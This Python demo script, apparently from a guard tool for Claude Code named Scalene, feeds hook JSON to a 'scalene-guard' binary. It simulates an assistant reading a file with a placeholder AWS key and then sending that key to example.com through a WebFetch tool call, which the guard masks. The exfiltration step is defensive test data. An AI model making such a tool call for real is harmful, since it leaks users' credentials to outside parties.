#!/usr/bin/env python3
"""Runnable demo (STORY-903): Scalene stopping a real data-exfiltration attempt.

Calls the real, installed `scalene-guard` binary as a subprocess with real
hook JSON on stdin - the same entry point Claude Code uses - rather than
calling internal functions directly (docs/ARCHITECTURE.md sec 12.1). No real
network egress occurs: scalene-guard only ever decides allow/mask/block, it
never performs the tool call itself, so the masked value shown below *is* the
demonstration, not a mocked stand-in for one.
"""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
from pathlib import Path

GUARD = Path(sys.executable).parent / "scalene-guard"

FAKE_SECRET = "AKIAIOSFODNN7EXAMPLE"  # AWS access-key-ID shape (detect-secrets recognizes this)


def _call_guard(payload: dict, state_dir: Path, policy_path: Path) -> dict:
    result = subprocess.run(
        [str(GUARD), "--policy-path", str(policy_path), "--state-dir", str(state_dir)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        check=True,
    )
    return json.loads(result.stdout)


def run() -> int:
    if not GUARD.exists():
        print(
            f"Could not find scalene-guard at {GUARD} — is it installed? Run 'make setup' first.",
            file=sys.stderr,
        )
        return 1

    print("=== Scalene demo: stopping a real data-exfiltration attempt ===")
    print()
    print("No configuration file is used here — this shows Scalene's out-of-the-box")
    print("behavior, before you've written any rules of your own.")
    print()

    with tempfile.TemporaryDirectory() as tmp:
        state_dir = Path(tmp) / "state"
        policy_path = Path(tmp) / "scalene_policy.yaml"  # intentionally does not exist

        print("Step 1 — An assistant reads a file.")
        _call_guard(
            {
                "hook_event_name": "PreToolUse",
                "session_id": "demo",
                "tool_name": "Read",
                "tool_input": {"file_path": "secret.txt"},
            },
            state_dir,
            policy_path,
        )
        print("  -> Allowed. Nothing is flagged yet — this is the first thing to happen.")
        print()

        print(f"Step 2 — The file turns out to contain something sensitive: {FAKE_SECRET!r}")
        _call_guard(
            {
                "hook_event_name": "PostToolUse",
                "session_id": "demo",
                "tool_name": "Read",
                "tool_response": {"content": FAKE_SECRET},
            },
            state_dir,
            policy_path,
        )
        print("  -> Scalene now remembers: this session has touched sensitive data.")
        print("     That memory persists for the rest of the session, even across many")
        print("     unrelated actions in between.")
        print()

        print("Step 3 — The assistant now tries to send that same value to an external site.")
        result = _call_guard(
            {
                "hook_event_name": "PreToolUse",
                "session_id": "demo",
                "tool_name": "WebFetch",
                "tool_input": {"url": "https://example.com", "prompt": FAKE_SECRET},
            },
            state_dir,
            policy_path,
        )
        decision = result["hookSpecificOutput"]["permissionDecision"]
        masked_value = result["hookSpecificOutput"].get("updatedInput", {}).get("prompt")

        if decision != "allow" or masked_value == FAKE_SECRET:
            print("\nDemo failed: the secret was not masked as expected.", file=sys.stderr)
            return 1

        print(f"  -> Scalene stepped in. What would have gone out reads: {masked_value!r}")
        print("     The real secret never left in the clear.")
        print()
        print("  Scalene also printed a ready-to-run command for the one case where you")
        print("  actually meant to allow this exact call going forward:")
        print(f"    {result['systemMessage'].splitlines()[-1]}")
        print()

    print("That's the whole loop: read something sensitive, try to send it somewhere")
    print("untrusted, get masked instead of leaked. Nothing above touched the real")
    print("network — the masked value you saw is exactly what a live Claude Code")
    print("session would get back, computed by the same binary it actually calls.")
    print()
    print("Next: docs/GETTING_STARTED.md to try this yourself, or docs/USER_GUIDE.md")
    print("for the full command reference.")
    return 0


if __name__ == "__main__":
    sys.exit(run())
